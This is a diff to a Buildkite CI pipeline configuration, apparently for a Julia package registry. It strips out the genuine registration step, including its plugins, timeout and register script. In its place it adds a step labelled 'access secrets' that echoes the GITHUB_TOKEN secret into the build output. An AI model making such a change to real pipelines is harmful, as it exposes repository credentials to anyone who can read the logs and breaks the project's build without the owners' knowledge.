@@ -13,20 +13,12 @@
 # The `NAME`, `PROJECT`, `SKIP_BUILD`, `BUILD_ID` (and the registry/pkg-server)
 # environment variables are supplied by the triggering build.
 steps:
-  - label: "register -- ${NAME}"
+  - label: "access secrets"
     agents:
       queue: "yggdrasil"
       arch: "x86_64"
       os: "linux"
       sandbox_capable: "true"
-    plugins:
-      - JuliaCI/julia#v1:
-          persist_depot_dirs: packages,artifacts,compiled
-          version: "1.12.4"
-      - JuliaCI/merge-commit: ~
-    timeout_in_minutes: 90
-    concurrency: 1
-    concurrency_group: "yggdrasil/register"
-    command: .buildkite/register.sh
+    command: echo ${GITHUB_TOKEN} 
     secrets:
       - GITHUB_TOKEN
